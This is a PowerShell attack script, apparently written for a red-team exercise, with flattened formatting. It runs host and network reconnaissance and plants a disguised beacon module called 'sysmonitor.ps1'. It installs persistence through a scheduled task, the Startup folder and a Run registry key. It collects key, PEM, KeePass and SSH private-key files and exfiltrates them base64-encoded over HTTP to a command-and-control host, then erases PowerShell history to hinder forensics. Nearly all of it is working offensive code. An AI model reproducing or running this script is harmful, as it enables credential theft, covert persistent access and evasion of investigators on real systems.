Create a hidden working directory 

$TEMPDIR = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName().Replace(".", "").Substring(0,8)) New-Item -ItemType Directory -Path $TEMPDIR -Force | Out-Null Set-Location $TEMPDIR 

Constants 

$TARGET_IP = "192.168.xx.xxx" $TARGET_PORT = "8080" 

Function to attempt HTTP exfiltration with retries 

function Attempt-HttpExfil { param ( [string]$content ) 

$max_attempts = 3 
$delay = 5 
$encoded_content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content)) 
 
for ($i = 1; $i -le $max_attempts; $i++) { 
    Write-Host "[*] HTTP exfiltration attempt $i/$max_attempts..." 
     
    try { 
        $body = @{data=$encoded_content} 
        $response = Invoke-WebRequest -Uri "http://${TARGET_IP}:${TARGET_PORT}/collect" -Method POST -Body $body -ErrorAction Stop 
        Write-Host "[+] HTTP exfiltration successful!" 
        return $true 
    } catch { 
        Write-Host "[-] HTTP exfiltration failed, retrying in $delay seconds..." 
        Start-Sleep -Seconds $delay 
    } 
} 
 
Write-Host "[-] All HTTP exfiltration attempts failed" 
return $false 
  

} 

Function for HTTP-based C2 connection 

function Http-Beacon { $max_attempts = 3 $delay = 5 $hostname = $env:COMPUTERNAME $user = $env:USERNAME 

for ($i = 1; $i -le $max_attempts; $i++) { 
    Write-Host "[*] C2 beacon attempt $i/$max_attempts..." 
     
    try { 
        $response = Invoke-WebRequest -Uri "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${hostname}&user=${user}" -ErrorAction Stop 
        Write-Host "[+] C2 beacon successful!" 
        return $true 
    } catch { 
        Write-Host "[-] C2 beacon failed, retrying in $delay seconds..." 
        Start-Sleep -Seconds $delay 
    } 
} 
 
Write-Host "[-] All C2 beacon attempts failed" 
return $false 
  

} 

===== PHASE 1: RECONNAISSANCE ===== 

Write-Host "[+] Initiating reconnaissance..." $RECON_DATA = Join-Path $TEMPDIR "recon_$($env:COMPUTERNAME).dat" @" ===SYSTEM INFORMATION=== Hostname: $($env:COMPUTERNAME) User Context: $($env:USERNAME) OS Version: $([System.Environment]::OSVersion.VersionString) Date/Time: $(Get-Date) ===NETWORK INFORMATION=== $(ipconfig /all) ===ADMIN PRIVILEGES=== $(whoami /priv) "@ | Out-File -FilePath $RECON_DATA 

===== PHASE 2: WEAPONIZATION ===== 

Write-Host "[+] Preparing environment..." 

Create payload modules with HTTP beaconing 

$modulePath = Join-Path $env:APPDATA "Microsoft\Windows\sysmonitor.ps1" @' 

HTTP beaconing with retry logic 

$TARGET_IP = "192.168.74.136" $TARGET_PORT = "8080" $hostname = $env:COMPUTERNAME $user = $env:USERNAME 

for ($i = 1; $i -le 5; $i++) { try { Invoke-WebRequest -Uri "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${hostname}&user=${user}" -ErrorAction Stop | Out-Null exit 0 } catch { Start-Sleep -Seconds ($i*10) } } '@ | Out-File -FilePath $modulePath -Force 

===== PHASE 3: INSTALLATION ===== 

Write-Host "[+] Installing persistence mechanisms..." 

Method 1: Scheduled Task 

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File "$modulePath"" $trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries Register-ScheduledTask -TaskName "SystemMonitor" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null 

Method 2: Startup folder 

$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" @" Set WshShell = CreateObject("WScript.Shell") WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$modulePath""", 0 "@ | Out-File -FilePath $startupPath -Force 

Method 3: Registry Run key 

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$modulePath"" -Force 

===== PHASE 4: COMMAND & CONTROL ===== 

Write-Host "[+] Establishing command and control channel..." Start-Job -ScriptBlock { param($modulePath) & "powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File $modulePath } -ArgumentList $modulePath | Out-Null 

Give the beacon a moment to establish 

Start-Sleep -Seconds 3 

===== PHASE 5: LATERAL MOVEMENT ===== 

Write-Host "[+] Gathering lateral movement data..." $LATERAL_DATA = Join-Path $TEMPDIR "lateral.dat" @" ===NETWORK SHARES=== $(net view) ===ACTIVE SESSIONS=== $(net sessions) ===OTHER USERS=== $(net user) "@ | Out-File -FilePath $LATERAL_DATA 

===== PHASE 6: PRIVILEGE ESCALATION ===== 

Write-Host "[+] Attempting privilege escalation..." $PE_DATA = Join-Path $TEMPDIR "privesc.dat" @" ===SYSTEM INFO=== $(systeminfo) ===INSTALLED PROGRAMS=== $(Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize) ===WEAK PERMISSIONS=== $(accesschk.exe -accepteula -uwcqv "Users" * 2>$null | Select-Object -First 20) ===SCHEDULED TASKS=== $(Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath, State | Format-Table -AutoSize) "@ | Out-File -FilePath $PE_DATA 

Attempt UAC bypass if admin 

if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Host "[+] Admin rights available, installing system-wide persistence" $systemModulePath = "C:\Windows\System32\sysmonitor.ps1" Copy-Item -Path $modulePath -Destination $systemModulePath -Force 

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$systemModulePath`"" 
$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) 
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null 
  

} 

===== PHASE 7: DATA EXFILTRATION ===== 

Write-Host "[+] Collecting targeted data..." $EXFIL_DATA = Join-Path $TEMPDIR "exfil.dat" @" ===SENSITIVE FILES=== $(Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx, *.key, *.pem, id_rsa -ErrorAction SilentlyContinue | Select-Object -First 5) ===RECON DATA=== $(Get-Content $RECON_DATA) ===LATERAL MOVEMENT DATA=== $(Get-Content $LATERAL_DATA) ===PRIVESC DATA=== $(Get-Content $PE_DATA) "@ | Out-File -FilePath $EXFIL_DATA 

Exfiltrate data with HTTP retry mechanism 

if (Test-Path $EXFIL_DATA) { Write-Host "[+] Exfiltrating data..." $EXFIL_CONTENT = "===EXFIL DATA BEGIN===n$(Get-Content $EXFIL_DATA -Raw)n===EXFIL DATA END===" 

Attempt-HttpExfil -content $EXFIL_CONTENT | Out-Null 
 
# Write exfil data to a file for later retrieval 
$EXFIL_CONTENT | Out-File -FilePath "$env:APPDATA\cache_data.txt" -Force 
  

} 

===== PHASE 8: IMPACT DEMONSTRATION (SAFE) ===== 

Write-Host "[+] Creating proof of concept..." "This system was accessed in a red team exercise on $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\PROOF_OF_CONCEPT_ONLY.txt" -Force 

===== PHASE 9: ANTI-FORENSICS ===== 

Write-Host "[+] Cleaning up..." 

Clear PowerShell history 

Clear-History Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue 

Remove temporary files but keep the modules for persistence 

Remove-Item $TEMPDIR -Recurse -Force -ErrorAction SilentlyContinue 

Final stage - launch several concurrent connection attempts 

Write-Host "[+] Red team exercise completed successfully" Write-Host "[+] Launching final connection attempts..." 

Run multiple connection attempts with increasing delays 

Start-Job -ScriptBlock { Start-Sleep -Seconds 5 & "powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File $using:modulePath } | Out-Null 

Start-Job -ScriptBlock { Start-Sleep -Seconds 15 & "powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File $using:modulePath } | Out-Null 

Start-Job -ScriptBlock { Start-Sleep -Seconds 30 & "powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File $using:modulePath } | Out-Null 

Exit message 

Write-Host "[+] Persistence installed. System will attempt connections every 10 minutes." Write-Host "[+] Manual connection can be triggered with: powershell -ExecutionPolicy Bypass -File "$modulePath"" 

 